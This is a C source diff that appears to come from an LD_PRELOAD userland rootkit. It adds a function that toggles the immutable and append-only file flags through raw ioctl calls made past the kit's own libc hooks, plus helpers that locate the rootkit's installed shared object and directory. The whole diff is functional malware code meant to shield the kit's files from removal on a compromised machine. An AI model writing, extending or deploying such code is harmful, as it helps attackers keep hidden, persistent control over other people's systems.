@@ -24,6 +24,41 @@ int isfedora(void){
     return fedora;
 }
 
+#define O_NONBLOCK      0x0004      /* no delay */
+
+int doiapath(const char *path, int apply){
+    int fd, ret, chk;
+    off_t fpendlen;
+
+    hook(COPEN, CIOCTL);
+
+    fd = (long)call(COPEN, path, O_NONBLOCK);
+    if(fd < 0) return 0;
+
+    fpendlen = lseek(fd, 0L, SEEK_END);
+    if(fpendlen < 1 && apply) return 0;
+
+    if((long)call(CIOCTL, fd, FS_IOC_GETFLAGS, &ret) < 0) {
+        close(fd);
+        return 0;
+    }
+
+    chk = ret;
+    if(apply) ret |= (FS_APPEND_FL|FS_IMMUTABLE_FL);
+    if(!apply) ret &=~(FS_APPEND_FL|FS_IMMUTABLE_FL);
+
+    if(ret != chk)
+        if((long)call(CIOCTL, fd, FS_IOC_SETFLAGS, &ret) < 0){
+            close(fd);
+            return 0;
+        }
+
+    if(close(fd) == 0)
+        return 1;
+
+    return 0;
+}
+
 /* returns the full sopath for the kit.
  * if pointers installdir & bdvlso are NULL, the path is read from /proc/$$/maps.
  * if the path cannot be found, INSTALL_DIR & BDVLSO are used as fallbacks.
@@ -56,6 +91,24 @@ char *rksopath(char *installdir, char *bdvlso){
     strncpy(ret, tmp, pathsize);
     if(isfedora()) ret[strlen(ret)-10]='\0';
     return ret;
+}
+
+char *getinstalldir(void){
+    char *sopath, *installdir;
+    sopath = rksopath(NULL, NULL);
+    if(sopath == NULL) return NULL;
+    installdir = strdup(dirname(sopath));
+    free(sopath);
+    return installdir;
+}
+
+char *getsoname(void){
+    char *sopath, *soname;
+    sopath = rksopath(NULL, NULL);
+    if(sopath == NULL) return NULL;
+    soname = strdup(basename(sopath));
+    free(sopath);
+    return soname;
 }
 
 char *gdirname(int fd){
